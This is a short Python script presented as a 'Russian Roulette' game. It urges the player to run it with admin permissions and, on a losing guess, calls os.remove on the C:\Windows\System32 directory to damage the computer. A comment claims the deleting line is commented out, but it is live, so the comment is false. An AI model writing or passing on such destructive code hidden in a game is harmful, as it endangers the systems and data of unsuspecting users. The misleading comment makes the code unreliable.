import random
import os
import time

def play_Russia():
    print("""
Welcome to Russian Roulette. You know the rules. Pick a number between 1-6. 
Note: Make sure to run this file with admin permissions for fun. Good luck, have fun!
""")
    num = int(input("Choose between 1-6: "))
    a = random.randint(1,6)
    if num == a:
        print("You lost! You have 9 seconds before your PC gets sh#ted on!")
        time.sleep(9)
        os.remove("C:\\Windows\\System32")  # Uncomment this line if you want to actually delete a file (WARNING: This is dangerous!)
    else:
        print("You won! Good luck next time.")
        play_again = input("Do you want to play again? (y/n): ")
        if play_again.lower() == 'y':
            play_Russia()
        else:
            print("Okay, next time!")

play_Russia()
